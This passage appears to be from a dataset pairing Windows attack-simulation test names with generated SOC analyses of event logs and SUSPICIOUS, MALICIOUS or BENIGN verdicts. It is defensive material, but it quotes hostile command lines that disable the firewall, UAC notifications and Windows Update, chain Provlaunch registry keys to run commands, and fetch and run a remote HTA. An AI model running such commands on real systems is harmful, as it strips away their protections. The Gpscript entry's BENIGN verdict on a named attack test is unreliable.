- The logs suggest that a user, likely with administrative rights (`admin_test`), executed several scripting actions. While these actions are not inherently malicious, without context, they might require validation with the user or team responsible for this machine.
- There is no evidence of escalated privilege attempts or unauthorized access based on the provided logs. However, the use of scripting tools could be part of regular administrative tasks or development activities.

### Resolution

Based on the observed log entries:

**Resolution: SUSPICIOUS**

Given the frequent use of `powershell.exe` and changes in `cmd.exe` and `jsc.exe` execution, it is suspicious because it involves compiling scripts, albeit without definitive signs of malicious activity. As such, the activity requires further investigation to determine its context—whether it is part of a scheduled maintenance task, development operations, or potential unauthorized testing.

### Recommended Actions
1. **Verify with User/Department**: Confirm if the observed PowerShell and command-line operations are part of normal administrative activities. Ensure this aligns with typical patterns for those user roles or scheduled scripts.
2. **Enhance Monitoring**: Increase the frequency or detail of monitoring for the involved script executions on this server to promptly identify any unauthorized or unusual usage patterns.
3. **Behavioral Analysis**: Check for behavioral baselines and determine if recent changes in these patterns reflect organizational policy or known projects.
4. **Review Policies**: Confirm adherence to security policies regarding script execution and administrative activities, possibly implementing stricter controls or alerts for unexpected script-based activities."
Disable Windows CMD application,"### Analysis of the Logs

Upon reviewing the provided Windows event logs, several observations are made concerning potential indicators of malicious activity:

1. **PowerShell Activity:**
   - A PowerShell command was executed to modify a registry key: `New-ItemProperty -Path ""HKCU:\Software\Policies\Microsoft\Windows\System"" -Name DisableCMD -Value 1`. This command alters the registry to potentially disable CMD.exe, which can be a tactic to hinder direct command execution or script operations from the command prompt. This activity is executed under a high privilege context, making it suspicious.

2. **Process Execution and Hierarchies:**
   - There are several instances of typical system administration execution tools like `whoami.exe`, `conhost.exe`, and `hostname.exe`. They are executed with high integrity levels by the user `SERVER002\admin_test`, which seems consistent with administrative operations.
   - The execution trail involving `powershell.exe` executing suspicious commands is parented by `wsmprovhost.exe`. This parent process is used for Windows Remote Management (WinRM), which is standard for remote administrative tasks but can be a flag for remote attacks if unexpected.
   - A cluster of events relating to `MicrosoftEdgeUpdate.exe` is noted, operating under `NT AUTHORITY\SYSTEM`. While this can be normal given the nature of auto-update services, vigilance is recommended, especially since repeated actions are seen within a short span.

3. **Time Anomaly:**
   - The system logs indicate several kernel events involving time change by `svchost.exe`, aligning the system time. Frequent or unexplained adjustments to system time can be suspicious if not a result of legitimate administrative actions or synchronizations.

4. **Edge Auto-Update Activities:**
   - Persistent entries related to Microsoft Edge updates could either be standard auto-update behavior or, if excessive, a sign of potentially unwanted applications masquerading as an update. Nonetheless, there’s no evident use of this for anomalies detected within the provided timespan.

### Threat Assessment

- The **PowerShell activity** modifying a critical registry key stands out as the most significant. This process reflects tactics often seen in malicious activities aiming to disrupt normal system utility access or fortify persistence mechanisms in an environment.
  
- The **context and repetition of specific processes** suggest either routine system administration work or a control mechanism potentially leveraged by an unauthorized actor to conduct benign-looking actions; however, the context gleaned by these logs does not sufficiently demonstrate overt malicious activity beyond the noted registry modification.

### Conclusion

- **Resolution: SUSPICIOUS**
  - The execution of the PowerShell script to alter registry settings presents a concerning activity that should be further investigated to understand the intention, especially if unauthorized administrators were not involved.

### Recommendations

1. **Further Investigation:** 
   - Verify whether the PowerShell command was intentionally executed by system administrators. This can be cross-referenced with user activity and system administration logs for validation.
   
2. **Audit Windows Defender Policies:**
   - Check for any recent changes to effective security policies which may have allowed such actions without alerts. 

3. **User Activity Review:**
   - Confirm the legitimacy of activities performed by `SERVER002\admin_test` around the timeline of logs, associating these actions with expected tasks.

4. **Perimeter and Internal Network Monitoring:**
   - Ensure enhanced monitoring on network traffic originating from this server, especially related to remote management ports to detect any unusual patterns.
   
By addressing the highlighted areas and implementing recommended actions, you can better ascertain the context of the suspicious activity and decide on the necessity of remedial actions to secure the environment."
LockBit Black - Disable Privacy Settings Experience Using Registry -cmd,"### Analysis of Log Entries

#### Security Log

- **Event ID 4616**: This event reflects the adjustment of the system time. The subject here is `LOCAL SERVICE` from `NT AUTHORITY`, and the process involved is `svchost.exe`. Time synchronization is a standard process for system maintenance and is usually benign unless otherwise manipulated for malicious intent. 

#### Application Log

- **Event by `edgeupdate`**: The logged events indicate that the `edgeupdate` service was stopped twice within a short period. There is no indication of a direct malicious process from stopping a legitimate service like `edgeupdate`, but frequent starts and stops could warrant further review to ensure this is expected behavior.

- **Event by `Security-SPP`**: The `Software Protection Platform Service` logs indicate regular activity related to software licensing and protection, which is normal for a Windows environment.

#### Sysmon Log

- **Process Creation Events**: 
  - A series of processes involving `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` are observed. Activities like using `wevtutil.exe` to interact with event logs and running of `whoami.exe` could be aligned with administrative tasks. However, execution through the `admin_test` user slightly prompts the need for verification of intentional administrative actions.
  - The command execution of `cmd.exe` with a Registry modification command `""cmd.exe"" /c reg add \""HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\"" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f""` is noteworthy. This could be an action to disable certain privacy features upon user logon—an operation that requires scrutiny as it alters system functionality under a high integrity level.

- **Process Integrity and Execution**: The execution of `cmd.exe`, `whoami.exe`, and other utilities under a high integrity level by the `admin_test` user does not inherently point to maliciousness but these actions could be leveraged in malicious operations or rogue internal activity if not performed under expected and secured administrative protocols.

- **`EdgeUpdate` Activities**: Many processes related to `MicrosoftEdgeUpdate.exe` suggest routine updates or checks. This is common for maintaining up-to-date software. Consistent logging under `NT AUTHORITY\SYSTEM` level is typical and appears standard for such a process.

#### System Log

- **Time Change Events**: These reflect standard time synchronization activities. Events indicate a successful time set operation, aligning with observations in the other logs.

#### Windows PowerShell Log

- Not provided, hence no analysis can be done.

### Conclusion

- **Summary of Findings**: Most logs show typical system behavior with occasional alterations in configurations (i.e., registry changes), periodic software updates, and synchronization of time. The critical aspect involves the execution of various command-line and system tools under an administrative context (`admin_test`). While these activities can be benign if performed under legitimate administrative oversight, they present an area for monitoring and validation.

- **Potential Threats or Risks**: There is potential risk in administrative commands altering system configurations without transparent documentation or request. Such actions warrant verification within the organization's change management procedures.

### Resolution

Based on the presented log entries:

**Resolution**: **SUSPICIOUS**

- **Recommendations**:
  1. Verify the legitimacy of administrative actions conducted by the `admin_test` account.
  2. Establish whether the time setting adjustments align with expected operations or maintenance schedules.
  3. Review organizational policies on registry modification procedures and audit for related administrative actions.
  4. Ensure enhanced monitoring and validation of administrative access, especially for privileges to alter system configurations.

Further investigation is recommended to confirm that all these activities were under authorized and secure procedures."
LockBit Black - Unusual Windows firewall registry modification -cmd,"### Detailed Analysis:

Upon reviewing the provided Windows event logs, several activities stand out that indicate potentially malicious or suspicious behavior. Here's the detailed breakdown:

1. **Process Execution Analysis:**
    - **wevtutil.exe and conhost.exe**: These processes are legitimate Windows processes; however, repeated executions of `wevtutil.exe` (used for managing Windows Event logs) could suggest tampering with logs or an attempt to evade detection.
    - **whoami.exe and HOSTNAME.EXE**: Both processes executed by the same user, `SERVER002\\admin_test`, these are benign if run sporadically; however, frequent execution might indicate an attacker trying to ascertain user privileges.
    - **cmd.exe with reg.exe**: This shows attempts to disable the Windows Firewall by changing registry keys, which is a clear indicator of malicious activity.

2. **Command Line Arguments:**
    - The command line used by `cmd.exe` to run `reg.exe` modifies the registry settings to disable the firewall: `""cmd.exe"" /c reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f & reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f`. This is a significant red flag indicating a potential security compromise.
  
3. **Privileges and Execution Context:**
    - **EventID 4672 (Special privileges assigned to new logon)** for user `admin_test` indicates the session was granted several system-level privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.), which are commonly abused during advanced attacks.

4. **Network Connections:**
    - Logon event showing NTLM authentication (`LogonType 3`), suggests that an external connection was made, possibly from the workstation named `DESKTOP-3HL5B2P`, which could potentially be a remote access point unless verified as legitimate.

5. **Microsoft Edge Update Activity:**
    - Multiple instances related to Microsoft Edge updating appear to be regular update checks and installations based on the directory (`Microsoft\\EdgeUpdate`). The processes run under the `NT AUTHORITY\\SYSTEM` account seem normal for such updates.

### Assessment of the Situation:

- **Malicious Activity Detected**: The evidence, particularly the disabling of crucial firewall settings using registry changes, strongly suggests malicious intent aiming to weaken the system's security posture.
- **Potential Threats**: The behavior indicates an attempt to gain stealthy persistence or further breach the network defenses by disabling security settings. The user's escalated privileges pose a risk of broader system compromise.
- **Immediate Risks**: If the attacker modifies firewall settings, other network-based attacks or exfiltration attempts can proceed undetected, putting the system and network at broader risk.

### Resolution:

- **Resolution: MALICIOUS**: The clear indication of unauthorized modifications to security settings is a definitive indicator of malicious activity. Immediate action is required.

### Guidance on How to Proceed:

1. **Immediate Containment**: Isolate the affected host (Server002) from the network to prevent further compromise or data exfiltration.
2. **User Account Review**: Investigate the `admin_test` account for unauthorized access or privilege escalations. Consider disabling the account temporarily until verification.
3. **Log Review and Monitoring**: Enhance monitoring on similar activities across your environment and review other logs for signs of lateral movement or additional compromise.
4. **Incident Response**: Initiate your company's incident response procedure to thoroughly investigate the breach, identify other potentially affected systems, and begin recovery and remediation processes.
5. **Security Hardening**: Ensure that registry editing and firewall settings modifications are restricted or logged and alerting is in place for similar future activities.

Taking these steps promptly will help mitigate the impact and strengthen defenses against future threats."
InstallUtil evasive invocation,"### Detailed Analysis of the Provided Windows Event Logs

The event logs provided include entries from Sysmon, Application, Windows PowerShell, and Security logs. Key observations and analyses are as follows:

#### Sysmon Log Observations:
1. **PowerShell Activity**: Multiple instances of PowerShell were executed by `SERVER002\admin_test`. Specifically, the command line of the PowerShell instance executed includes a suspicious script path: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.004\\src\\InstallUtilTestHarness.ps1`. This activity involved copying `InstallUtil.exe` to `notepad.exe`, suggesting a likely attempt to bypass security controls using a common living-off-the-land technique.
   
2. **Executable Creation and Execution**: The occurrence of commands that involve compiling or manipulating executables (`Add-Type`) within PowerShell scripts is highly suspicious, especially when dealing with files in temporary directories. This pattern and execution mimic behaviors often associated with malware or penetration testing scripts.

3. **Task Execution and Processes**: Numerous Windows system processes (e.g., `conhost.exe`, `wevtutil.exe`) are executed around the same time, which is typical; however, the context of being driven by PowerShell scripts aimed at directory manipulation and executable copying indicates unusual activity.

#### Application Log Observations:
- Logs show `edgeupdate` activities, which could relate to normal updates for Microsoft Edge. The absence of details to suggest anything beyond benign usage should be noted.

#### Windows PowerShell Log Observations:
- The PowerShell logs reflect detailed and complex command execution using scripts, which align with the previously discussed suspicious PowerShell activities observed in the Sysmon logs. The main actions involve executing a potentially malicious script and performing executable-based operations that deviate from common administrative tasks.
  
#### Security Log Observations:
- Multiple sessions initiated and activities logged with elevated privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.). The security logs confirm extensive system-level operations consistent with a script running high-privileged tasks, which align with the suspicious PowerShell operations.

### Conclusion and Resolution:
The convergence of suspicious PowerShell script execution, alongside the attempts to handle executable files in unconventional manners within temporary directories, aligns with tactics often employed in malicious activities, such as privilege escalation attempts, persistence mechanism deployment, or lateral movement.
   
Therefore, given the nature and context of the events, the resolution for the situation depicted in the logs is:

- **MALICIOUS**: The logs contain activity strongly indicative of malicious behavior. The observed PowerShell command usage and executable manipulation suggest a compromise or unauthorized activity on the server.

### Guidance on How to Proceed:
- Immediately isolate the affected host from the network.
- Conduct a detailed forensic analysis to trace the source of the malicious script and validate all entries.
- Change all administrative credentials and review Group Policies restricting script execution.
- Ensure that comprehensive monitoring and incident response protocols are in place to handle potential future attacks."
Snake Malware Encrypted crmlog file,"### Analysis

#### Observations:

1. **Sysmon Logs**:
   - Multiple executions of utility binaries (`whoami.exe`, `conhost.exe`, `wevtutil.exe`, `HOSTNAME.EXE`).
   - Powershell command with intent to create a new item with attributes 'Hidden', 'System', 'Archive'. 
   - The command executed was:

     ```powershell
     ""powershell.exe"" & {$file = New-Item $env:windir\registration\04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = 'Hidden', 'System', 'Archive'; Write-Host \""File created: $($file.FullName)\""}
     ```

   - Several legitimate system processes are running under high integrity or system context, which seems normal for administrative tasks but raises interest due to their context in the logs (especially the `wevtutil.exe`).

2. **Security & System Log**:
   - Security events (5379) that relate to credential reads from a Microsoft account fail (ReturnCode `3221226021`), frequent and could suggest unauthorized attempts to read credentials.
   - System logging shows standard Windows Update activities, including updating Defender definitions.

3. **PowerShell Logs**:
   - Shows PowerShell being used to execute commands, corroborating with the Sysmon logs for the creation of hidden files.

#### Assessment:

- **Powershell Activity**: The Powershell activity for creating a hidden, system, archive file is suspicious. This type of action could potentially indicate tactics for persistence or obfuscation, typical in post-exploitation scenarios.
  
- **Wevtutil and Other Executables**: Multiple executions of utilities (`wevtutil.exe`, `whoami.exe`, etc.) which might indicate an attempt to enumerate system information, clear logs, or manage log files, are suspicious, especially when initiated by the same user and in a context with a lack of a descriptive parent process.

- **Security Log Anomalies**: There are credential read failures indicated in the security log, albeit they also could be attributed to normal probing activities or misconfiguration, need further context.

### Resolution
The observed behaviors such as the use of PowerShell to manipulate the filesystem, attempts to access credentials, and host activity indicate potential malicious behavior that warrants deeper investigation.

- **Resolution**: **SUSPICIOUS**

### Recommendations for Next Steps

- **Deep Dive into Context**: Gather additional context around the `admin_test` user and their actions, cross-referencing if these activities were authorized.
- **File Inspection**: Examine the file created by the PowerShell script for content and purpose.
- **Credential Access**: Investigate the credential read attempts to determine if they were indeed legitimate system operations.
- **Further Monitoring**: Continuously monitor for any unauthorized or unusual network or system access that might suggest external control or lateral movement.
- **Confirm Integrity**: Verify the integrity of critical system files and security services to ensure they’re not compromised.

This analysis suggests a preliminary indication that may necessitate a security incident response if the context aligns with unauthorized activity."
Set a firewall rule using New-NetFirewallRule,"### Detailed Analysis of Logs

#### System Log

1. **TimeChange Events**: 
   - Event ID 1 and 24 indicate system time changes. The time was set back by approximately 6 seconds (\(12:05:59.9896467\) to \(12:05:53.8925729\)). Although time synchronization can occur for legitimate reasons, unexpected time changes can be indicative of an attempt to cover tracks (e.g., log tampering).

#### Sysmon Log

2. **Process Execution Events**:
   - Execution of `powershell.exe` with a command to create a new firewall rule allowing inbound TCP traffic on port 21. This seems unusual, especially if not part of a planned configuration change, given that port 21 is traditionally associated with FTP and could potentially expose the system to unauthorized access.
   - `wevtutil.exe` and `conhost.exe` are executed multiple times within a short period. While they are legitimate Windows utilities, frequent invocation, particularly of `wevtutil` which can be used for modifying event logs, may warrant further scrutiny if not corroborated with a known good change.

3. **Microsoft Edge Related Processes**: 
   - Numerous executions of processes related to Microsoft Edge updates and installation. These events may appear suspicious due to the volume of similar commands but can be benign if they correlate with legitimate browser updates or installations.
   
#### Application Log

4. **Edge Update Service Status**:
   - Logs indicate the Edge update service has stopped. While not inherently suspicious, it's essential to verify if this action aligns with routine system or service management operations.

#### Windows PowerShell Log

5. **PowerShell Execution**:
   - Confirmed command execution to add a firewall rule as seen in the Sysmon logs. This is generally considered suspicious, especially if performed outside scheduled changes or without authorization, thereby posing a potential risk of unauthorized access.

#### Security Log

6. **Time Change Security Events**:
   - By correlating with the system logs, these show evidence of the same time rollback events, indicating that the time changes were recorded under the security audit, further emphasizing the need to understand the reason for these adjustments.

### Assessment

- **Suspicious Activity**: The use of `powershell.exe` to alter firewall configurations is concerning, especially given its potential to expose the system on an FTP port, and requires immediate investigation. The extensive use of `wevtutil.exe` might suggest log manipulation attempts.
- **Time Changes**: Could indicate efforts to obscure the sequence of events which is a known tactic often associated with malicious activities.

### Resolution

- **Resolution**: **SUSPICIOUS** - The activity involving PowerShell altering firewall rules is suspicious and potentially hazardous. The time changes and frequent utility executions further require investigation to rule out malicious intent.

### Recommendations

- **Investigate the originating source of the PowerShell command** to determine if it was legitimate or executed by an unauthorized party.
- **Review the context of time changes** to ensure they align with legitimate synchronization activities and verify there were no tampering aims.
- **Audit recent access patterns** and configuration changes to identify any anomalies or unauthorized actions.
- **Conduct a security review and system integrity checks**, focusing on logs, firewall rules, and service configurations to mitigate and rectify potential unauthorized access or configurations.

Further analysis and potentially a more in-depth forensic investigation would be advised to comprehensively address the identified risks."
Disable Windows OS Auto Update,"Based on the analysis of the given Windows event logs:

1. **Application Log Analysis:**
   - The Software Protection Platform Service (SPP) logged an event indicating an operation by the RulesEngine at a system time in the future, which can sometimes indicate time anomalies or forward-dated logs. However, it's not suspicious in isolation.
   - The edgeupdate service was stopped twice in quick succession. This is a normal operation indicating service behavior, and alone doesn't indicate malicious activity.

2. **System Log Analysis:**
   - Time correction events logged by Kernel-General and Time-Service indicate time adjustments, which are common during daylight saving transitions or system clock corrections. No unusual activity is implied by these adjustments alone.

3. **Sysmon Log Analysis:**
   - The logs indicate the use of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe` by a user account ""SERVER002\\admin_test"". These processes are typically used for administrative tasks and system information querying.
   - A notable entry is the use of `cmd.exe` with a command to modify Windows Update settings through the registry, disabling automatic updates (`/c reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoUpdate"" /t REG_DWORD /d 1 /f`). This behavior can be construed as suspicious as it may indicate an attempt to control system patches, a potential tactic used by adversaries to prevent detection via updates.
   - There are multiple events regarding Microsoft Edge Update processes. They show multiple instances of updates and installations, which, on a managed company server, is routine and non-suspicious if expected. However, any unauthorized installation behavior should be verified against internal policy standards.

4. **Security Log Analysis:**
   - Similar time adjustments were registered in the Security logs as seen in the System logs. This corresponds to system behavior and time synchronization actions which are generally non-malicious.

**Conclusion:**
- The presence of commands issued via `cmd.exe` to disable Windows Update is concerning and not typical of routine maintenance. Such activity often signifies attempts to manipulate update policies, common in threat actor methodologies to maintain persistence.
  
Given these findings, I would classify the activity as **SUSPICIOUS**. This conclusion is due to the modification of registry settings associated with updates without further context or justification, which warrants further investigation. Additional environment context, such as user roles and justifications for these changes, should be gathered. Further analysis should also consider correlation with other network activity and potentially hostile indicators. 

**Recommended Actions:**
- Investigate the user ""SERVER002\\admin_test"" to verify if this change was authorized.
- Review any policies or logs related to system update management for this server.
- Conduct a full system audit to determine if there are any other unauthorized changes or activities.
- Consider conducting a threat hunt or deploying additional monitoring to identify the potential presence of adversaries in the network."
Windows Add Registry Value to Load Service in Safe Mode with Network,"### Analysis:

1. **Sysmon Logs Review:**
   - **Frequent Use of `wevtutil.exe`:** The repeated use of `C:\Windows\System32\wevtutil.exe` by the user `SERVER002\admin_test` (Event IDs: 17950, 17954, 17958, 17962, 17966) may indicate suspicious activity as this command is often used to manipulate event logs. Although common in administrative tasks, excessive usage might suggest an attempt to cover tracks.
   - **Administrative Tools Usage:** The use of `cmd.exe` with the `REG ADD` command indicates an attempt to modify the registry, specifically the `SafeBoot` configuration (Event ID: 17976). This could suggest an attempt to ensure persistence or to modify boot configurations in a potentially malicious manner.
   - **Common Administrative Processes:** Execution of benign processes such as `whoami.exe`, `hostname.exe`, and `conhost.exe` is seen throughout. Their presence alone, without unusual command-line arguments, is generally not suspicious.
   - **Microsoft Edge Update Processes:** Multiple Microsoft Edge Update processes are observed running under the `NT AUTHORITY\SYSTEM` user, which indicates routine software updates and is not inherently suspicious.

2. **Security Log Insights:**
   - **Privilege Escalation:** A login by `SERVER002\admin_test` with many powerful privileges (Event ID: 30352) including `SeDebugPrivilege` and `SeLoadDriverPrivilege`, which might be benign under normal administration but can also be abused by malicious insiders or breached accounts.
   - **Login Events:** The login sessions and security audits appear regular based on available logs, indicating continuous activity by the `SERVER002\admin_test` user.

3. **System Logs and Time Changes:**
   - **Time Skew Detected:** The system time appears to have been altered intentionally or through an error corrected by `svchost.exe` processes (Event IDs: 3568, 3571). Consistent time changes might indicate attempts to obscure log timestamps.

4. **Application and Other Logs:**
   - **Edge Update Service Stops:** Stopping of services may suggest software updates or configuration changes (Event IDs: 2384, 2385), but without context or errors, they do not directly indicate malicious activity.

### Assessment:

- **Suspicious Activity Identified:** The usage of `wevtutil.exe` and registry modifications via `cmd.exe` raises suspicion due to their commonality in malicious activities related to log tampering and system configuration changes.
  
- **Routine Administrative Activity and Software Updates:** The presence of specific Microsoft Edge update-related processes suggests routine update activities. Likewise, typical administrative logins and services indicate normal operation with potential risks.

### Resolution:

**SUSPICIOUS** - The logs contain activities that require further investigation. Increased monitoring or reviewing the context of these operations is recommended. Confirm the legitimacy of the `admin_test` account's operations and ensure configuration changes are authorized. Possible recommendations include:
- Reviewing user `admin_test` activities and permissions.
- Verifying the intent and justification for registry modifications and `wevtutil.exe` usage.
- Enhanced monitoring for unusual changes to system time which could mask malicious activity."
Create Windows Hidden File with powershell,"Upon reviewing the logs, the following observations can be made regarding suspicious or anomalous behavior:

1. **Use of `cmd.exe` and PowerShell**: 
   - There are multiple instances of `cmd.exe` being used to check for the existence of or to create a `data.txt` file in the user’s temporary directory. This could signify a script or automated task that is running checks or gathering information. Its use is characterized by high integrity levels which involve the `admin_test` user.
   - The use of PowerShell with commands aimed at modifying file attributes (`$file.attributes='Hidden'`) is suspicious, as it indicates someone or a script is trying to hide the `data.txt` file. PowerShell is often used by attackers for script-based attacks and can indicate potential compromise, particularly when modifying file visibility.

2. **Recurrent Use of System Tools**:
   - Tools such as `wevtutil.exe`, `whoami.exe`, and `hostname.exe` are used. `wevtutil.exe` is used for managing Windows Event Logs, which might indicate log manipulation attempts. The command `whoami.exe` can be used to verify user privileges, which could either be a benign check or reconnaissance for privilege escalation.

3. **Microsoft Edge Update Service**:
   - The logs show the presence of the `MicrosoftEdgeUpdate.exe` processes for updating Microsoft Edge. This is typically a benign process, but it appearing in the logs could be noteworthy if it was installed or triggered unusually.

4. **Logging Context**:
   - No explicit signs of privilege escalation attempts or abnormal network connections are observed in these logs. However, the use of high-integrity processes and PowerShell scripts is concerning.

### Assessment

The combination of command-line operations for file existence checks, file content manipulation (making it hidden), and the utilization of `wevtutil.exe` raises concerns of potential malicious activity aiming to manipulate or hide activities within the system.

### Conclusion

The logs display behavior that could suggest possible malicious activity, specifically where PowerShell operations indicate intent to hide file activities (`data.txt`). Furthermore, the use of system utilities to potentially manage event logs pushes this observation towards the potential for malicious intents.

### Resolution

- **SUSPICIOUS**

Given the observations, it is advised to further investigate the following:
- Analyze the content of `data.txt` if accessible, and other modifications it undergoes.
- Examine user `admin_test` activities for anomalies during the times logs were generated, particularly looking for commands issued or scripts launched.
- Delve into the typical usage patterns and permissions of the `admin_test` account.
- Further scrutinize PowerShell and task scheduler logs to decipher any involvement of other scripts or scheduled tasks.

Moving forward, enhancing monitoring and detection rules focusing on PowerShell script use and changes to system files or logs could be prudent."
Invoke HTML Application - Direct download from URI,"Upon analyzing the log entries provided from the Windows host, certain activities stand out as requiring further investigation due to their potentially suspicious nature. Here is the breakdown of the observed behavior:

1. **PowerShell Execution**:
   - The PowerShell logs show several entries related to the execution of `powershell.exe` with command line arguments involving the `Invoke-ATHHTMLApplication` function and an `HTA` (HTML Application) file downloaded from the URL `https://raw.githubusercontent.com/file/file-file/24549e3866407c3080b95b6afebf78e8acd23352/files/data.005/src/data.005.hta`.
   - Usage of PowerShell to download and execute scripts from external sources, especially via `mshta.exe`, is a common technique employed in attacks, particularly for initial access or payload delivery.
   
2. **Sysmon Event Analysis**:
   - The Sysmon logs confirm the execution of `powershell.exe` under the user `SERVER002\admin_test`, consistent with the PowerShell logs. This correlates with the suspicious activity of invoking external scripts.
   - The presence of other executable files like `wevtutil.exe` and `conhost.exe` are normal operations but could be leveraged in conjunction with PowerShell scripts for deeper malicious activity. Here, their appearance alone is not inherently indicative of an issue without further context.

**Assessment**:
The primary concern lies in the PowerShell invocation, which is attempting to download and execute content externally. This is a classic initial step in many attack chains (including those for deploying malware or facilitating further malicious operations).

**Resolution**: **SUSPICIOUS**
The activities logged surround the potential for malicious script execution using PowerShell to retrieve and execute external content. While this doesn't incontrovertibly confirm a malicious compromise due to lack of full context or follow-up actions, the risk is pronounced enough that further investigation is warranted.

**Guidance**:
- Conduct a detailed investigation into the URL and the contents of the `HTA` file accessed, ensuring it isn't associated with known malicious campaigns or indicators.
- Check for any persistence mechanisms that may have been established following these actions (e.g., registry modifications, scheduled tasks).
- Verify with the user `admin_test` to determine if this action was authorized or aligned with their expected activities.
- Consider implementing enhanced monitoring on the affected machine and user activities, along with blocking unauthorized outbound network connections to prevent such downloads in the future."
Provlaunch.exe Executes Arbitrary Command via Registry Key,"Upon reviewing the provided Windows event logs, the following observations have been made:

### Suspicious or Anomalous Behavior:
1. **Sysmon Events and Command Execution:**
   - There is a frequent invocation of `wevtutil.exe` and `conhost.exe` by the `SERVER002\admin_test` user. While `wevtutil.exe` is a legitimate tool used to manage event logs, its frequent use without a clear reason could suggest an attempt to clear logs or manipulate them.
   - A noteworthy event is the execution of `cmd.exe` with a command line that modifies the registry and executes `calc.exe` via `provlaunch.exe`. The command string looks as follows:
     ```
     ""cmd.exe"" /c reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0 & reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe & c:\windows\system32\provlaunch.exe LOLBin
     ```
   - This kind of manipulation can be associated with Living off the Land (LotL) attacks where legitimate system tools are used for malicious purposes.

2. **Registry Manipulation and Unusual Process Execution:**
   - The command manipulates the registry to add entries, which could be used for persistence or to execute specific commands without direct user input.
   - The use of `provlaunch.exe` with what appears to be crafted entries is another red flag. This combination can potentially serve as a method to bypass application control mechanisms or to escalate privileges.

3. **Microsoft Edge Update Execution:**
   - Multiple instances of Microsoft Edge Update processes are seen executing during the event period. While legitimate, the multiple entries and the usage of file paths that include temporary directories (e.g., `C:\Program Files (x86)\Microsoft\Temp\`) are suspicious without additional context around patching or updates.

4. **Time Synchronization Events:**
   - The security log shows adjustments to the system time, which, by themselves, are not inherently malicious but should be verified to ensure there is no misleading of log timestamps.

### Indicators of Malicious Activity or Compromise:
- The combination of registry manipulation, the use of `provlaunch.exe`, and the suspicious invocation of common utilities such as `cmd.exe` with suspicious arguments suggests unauthorized or malicious behavior.
- The execution of `calc.exe` via a chained command could be a test payload to verify execution of more complex commands.

### Assessment:
Given the noted indicators, the activity in these logs exhibits signs of potential compromise. The attempt to use system utilities with unusual command lines and the registry manipulations are notable as they may indicate steps towards persistence or privilege escalation.

### Final Resolution:
- **MALICIOUS** - Due to the presence of specific indicators such as suspicious command-line executions, registry alterations, and the potential for unauthorized persistence mechanisms, the activity is categorized as malicious. It requires immediate attention and further investigation.

### Recommendations:
1. **Immediate Response:** Isolate the affected system to prevent further exploitation.
2. **Deeper Analysis:** Conduct a more detailed forensic analysis of the system to identify the extent of the compromise.
3. **Remediation:** Review and restore system integrity, addressing any unauthorized changes.
4. **Monitoring and Review:** Enhance monitoring to identify similar anomalies in the future and prevent recurrence.
5. **User Education:** Educate users on recognizing signs of potential phishing or unauthorized access attempts leading to such intrusions."
Lolbin Gpscript startup option,"The provided logs consist of multiple entries from different types of Windows logs, including PowerShell, Security, Application, System, and Sysmon logs. Below is a detailed analysis of the logs with a focus on detecting suspicious or anomalous behavior.

### Security Log Analysis
- The Security log comprises EventID 4616, indicating changes in the system time. The events show that the system time was adjusted slightly (by milliseconds). This is typically related to time synchronization with a time server and does not inherently indicate malicious activity.

### Application Log Analysis
- The logs related to ""edgeupdate"" indicate the stopping of services, which could be consistent with regular application maintenance or updates, particularly related to Microsoft Edge. There are no indicators of malicious activity in these entries.

### System Log Analysis
- Changes in system time are shown, consistent with the Security log entries. Again, these can be explained by time synchronization processes like updates from ""time.windows.com.""

### Sysmon Log Analysis
- The entries primarily feature standard Windows executables like `whoami.exe`, `cmd.exe`, and various Microsoft Edge update processes. Several executions of `MicrosoftEdgeUpdate.exe` are visible, corresponding with typical behaviors during software updates.
- Notably, `cmd.exe` is executed with the command `/c Gpscript /startup`. While executing PowerShell or CMD scripts can sometimes indicate suspicious activity, in this context, the command appears benign and consistent with Group Policy script execution on startup.
- A significant number of logs reference Edge updates, with `MicrosoftEdgeUpdate.exe` running multiple times. The presence of Microsoft Edge related activities is consistent with automated updates rather than manual, suspicious activity.

### Overall Assessment
After analyzing the logs:
- Most activities seem to revolve around system updates, service stops, and time synchronization, which are routine operations on Windows systems.
- The repeated executions of Microsoft Edge update processes suggest a scheduled or triggered update process, rather than malicious behavior.
  
**Resolution: BENIGN**

In conclusion, the collected logs do not contain any definitive indicators of malicious activity. The entries primarily reflect normal, expected operations involving system time synchronization and Microsoft Edge updates. No evidence of unusual process execution, suspicious command-line arguments, or privilege escalation was found. Further investigation is not warranted given the evidence at hand. If concerns persist, monitor for any additional unusual activities and ensure all systems are regularly patched and security configurations are checked."
Disable UAC notification via registry keys,"Upon analyzing the provided Windows event logs, I have identified several notable activities that warrant further attention:

1. **Registry Modification**: 
   - There is an entry where `cmd.exe` executed a command to modify the registry key `HKLM\SOFTWARE\Microsoft\Security Center` to disable User Access Control (UAC) notifications (`UACDisableNotify`). This activity can be indicative of an attempt to lower the security posture of the system, which is often associated with malicious activity.

   - Sysmon Event ID 1 has logged the execution of the `cmd.exe` with a command to modify registry, which is a suspicious activity:
     ```plaintext
     ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Security Center"" /v UACDisableNotify /t REG_DWORD /d 1 /f
     ```

2. **High-Integrity Processes**:
   - Several processes are executed with high integrity, and notably, the `cmd.exe` was executed from a temporary directory, which is unusual for legitimate processes. This might indicate privilege escalation or unauthorized administrative activity.

3. **Process Execution Patterns**:
